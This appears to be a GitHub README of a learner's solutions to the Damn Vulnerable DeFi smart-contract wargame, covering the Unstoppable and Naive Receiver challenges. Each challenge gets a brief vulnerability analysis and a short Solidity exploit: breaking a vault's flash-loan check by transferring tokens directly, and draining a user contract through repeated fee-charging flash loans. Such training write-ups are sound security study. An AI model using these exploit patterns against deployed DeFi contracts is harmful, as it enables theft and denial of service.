# 🛡️ DVDeFi Challenges

This repository contains my solutions to the [Damn Vulnerable DeFi](https://github.com/theredguild/damn-vulnerable-defi) challenges — a wargame for learning smart contract security in DeFi protocols.

---
Hey, I'm Anudeep diving deep into smart contract auditing and exploring the security side of DeFi 🚀

## Introduction

I've been playing around with Damn Vulnerable DeFi, and this write-up is a collection of my notes, thought process, and how I tackled each challenge. If you're following along, I recommend taking a look at the challenge contracts yourself. You don't need to memorize every line, but having a solid grasp of how they work will definitely help.

---

## Challenge #1 — Unstoppable

**🧠 Task:** Stop the vault from offering flash loans.

### 🔍 Analysis

`flashLoan()` checks if `totalAssets == totalSupply`. If someone sends tokens directly to the vault, the balance increases but `totalSupply` doesn’t, so the condition fails.

### ✅ Solution

```solidity
vm.startPrank(attacker);
token.transfer(address(vault), 1 ether);
vm.stopPrank();
```

---

## Challenge #2 — Naive Receiver

**🧠 Task:** Drain ETH from a user contract via the flash loan pool.

### 🔍 Analysis

The pool allows anyone to trigger a flash loan for any receiver. The fixed 1 ETH fee is always paid by the receiver. Spam the user’s contract to death.

### ✅ Solution

```solidity
for (uint i = 0; i < 10; i++) {
  pool.flashLoan(receiver, 0);
}
```

*Receiver loses 10 ETH paying the fees.*

---